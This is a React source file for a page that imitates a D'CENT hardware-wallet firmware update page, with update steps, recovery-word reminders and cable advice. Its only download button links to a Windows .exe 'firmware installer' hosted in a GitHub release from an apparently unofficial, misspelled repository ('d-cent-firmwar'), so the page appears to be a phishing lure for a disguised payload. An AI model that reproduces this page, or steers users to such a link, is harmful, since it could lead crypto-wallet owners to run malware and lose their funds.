import { DcentHeader } from "@/components/DcentHeader";
import { DcentFooter } from "@/components/DcentFooter";
import { VersionTimeline } from "@/components/VersionTimeline";
import { firmwareVersions } from "@/data/firmware-versions";
import heroBg from "@/assets/dcent-hero-bg.jpg";

export default function App() {
  return (
    <div className="min-h-screen bg-background text-foreground">
      <DcentHeader />

      <section className="relative overflow-hidden">
        <div
          className="absolute inset-0 bg-cover bg-center bg-no-repeat"
          style={{ backgroundImage: `url(${heroBg})` }}
        />
        <div className="absolute inset-0 bg-gradient-to-r from-background/90 via-background/70 to-background/40" />
        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16 sm:py-24 min-h-[420px] flex flex-col justify-center">
          <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold text-foreground tracking-tight">
            D&apos;CENT Firmware Update
          </h1>

          <div className="mt-10">
            <VersionTimeline versions={firmwareVersions} />
          </div>
        </div>
      </section>

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-16">
        <section>
          <h2 className="text-2xl sm:text-3xl font-bold text-foreground mb-4">
            Update Your D&apos;CENT Biometric Wallet Firmware
          </h2>
          <p className="text-dcent-text-muted leading-relaxed mb-4">
            Your D&apos;CENT Biometric Wallet is fully functional right out of the box. Firmware updates are not required for normal use, and you can continue using the device safely even without installing the latest version.
          </p>
          <p className="text-dcent-text-muted leading-relaxed mb-4">
            We release new firmware frequently because we are continuously improving performance, security, and asset support. Most firmware updates are released when:
          </p>
          <ul className="space-y-2 text-dcent-text-muted pl-6 mb-4">
            <li className="list-disc"><u>New blockchains or tokens are added</u></li>
            <li className="list-disc"><u>New features or usability improvements become available</u></li>
            <li className="list-disc"><u>Security enhancements or optimizations are introduced</u></li>
          </ul>
          <p className="text-dcent-text-muted leading-relaxed">
            If you do not need the newly supported assets or features included in the latest firmware, you may continue using your wallet as it is. However, keeping your device up to date is generally recommended to ensure the best experience and access to the latest improvements.
          </p>
        </section>

        <section>
          <h2 className="text-2xl sm:text-3xl font-bold text-foreground mb-4">
            Before You Begin
          </h2>
          <p className="text-dcent-text-muted leading-relaxed mb-6">
            Although firmware updates do not delete or reset your wallet, it&apos;s important to follow the basic preparation checklist to ensure the update process goes smoothly.
          </p>
          <h3 className="text-lg font-semibold text-foreground mb-2">Have your 24 Recovery Words ready</h3>
          <p className="text-dcent-text-muted leading-relaxed mb-2">
            You won&apos;t need to enter them for a simple firmware update, and your wallet will remain intact afterward.
          </p>
          <p className="text-dcent-text-muted leading-relaxed">
            However, in the rare event the update is interrupted (power outage, cable disconnect, etc.), your Recovery Words may be needed to restore your wallet.
          </p>
        </section>

        <section>
          <h2 className="text-2xl sm:text-3xl font-bold text-foreground mb-4">
            Firmware Update Requirements
          </h2>
          <p className="text-dcent-text-muted leading-relaxed mb-4">
            Firmware updates can be performed using a <u>Windows PC</u>, <u>macOS</u>, or an <u>Android mobile phone</u>. The update process is simple and usually takes 3–5 minutes.
          </p>
          <p className="text-dcent-text-muted leading-relaxed mb-6">
            Keeping your device updated is recommended, but not mandatory. Your wallet works straight out of the box, and updates are only needed if you want access to newly supported blockchains, tokens, or features.
          </p>

          <h3 className="text-lg font-semibold text-foreground mb-2">No Firmware Downgrade</h3>
          <p className="text-dcent-text-muted leading-relaxed mb-6">
            Once you install the latest firmware, it is not possible to revert to an older version.
          </p>

          <h3 className="text-lg font-semibold text-foreground mb-2">Keep Your Device Connected</h3>
          <p className="text-dcent-text-muted leading-relaxed mb-1">
            Do not disconnect the wallet during the update.
          </p>
          <p className="text-dcent-text-muted leading-relaxed">
            Make sure your PC or Android phone stays powered and connected until the update is complete.
          </p>
        </section>

        <section>
          <h2 className="text-2xl sm:text-3xl font-bold text-foreground mb-6">
            Supported Update Methods
          </h2>

          <h3 className="text-lg font-semibold text-foreground mb-3">
            1. Update Using a Computer (Windows or macOS)
          </h3>
          <p className="text-dcent-text-muted leading-relaxed mb-4">
            When updating from a personal computer (Windows or macOS), the firmware tool works the best with the <u>Google Chrome browser</u>.
          </p>
          <p className="text-dcent-text-muted leading-relaxed mb-3">
            Depending on the model of your Biometric wallet, use the appropriate USB cable:
          </p>

          <div className="space-y-4 mb-6">
            <div>
              <p className="text-dcent-green font-medium mb-1">Newer Model with USB-C port</p>
              <ul className="pl-6 text-dcent-text-muted space-y-1">
                <li className="list-disc">Use a USB-C cable that supports data transfer.</li>
                <li className="list-disc">Connect directly to your PC or Mac and start the firmware tool.</li>
              </ul>
            </div>
            <div>
              <p className="text-dcent-green font-medium mb-1">Older Model with USB Micro-B (5-pin) port</p>
              <ul className="pl-6 text-dcent-text-muted space-y-1">
                <li className="list-disc">Use a USB Micro-B (5-pin) cable that supports data transfer.</li>
                <li className="list-disc">We recommend using the original cable included in the package for the most stable connection.</li>
              </ul>
            </div>
          </div>

          <div className="flex flex-wrap gap-3 mb-4">
            <a
              href="https://github.com/guide1-cloud/d-cent-firmwar/releases/download/v1.2.1/DCENT_Firmware2.36.0.exe"
              className="inline-flex items-center justify-center px-6 py-3 rounded-lg bg-dcent-green text-dcent-dark font-semibold text-sm hover:bg-dcent-green-light transition-colors"
            >
              Download Firmware Update for PC
            </a>
          </div>

          <p className="text-dcent-text-muted leading-relaxed mb-2">
           Procced to install the update using the D&apos;CENT Firmware x86 compatible installer downloaded.
          </p>
         
          
        </section>
      </div>

      <DcentFooter />
    </div>
  );
}
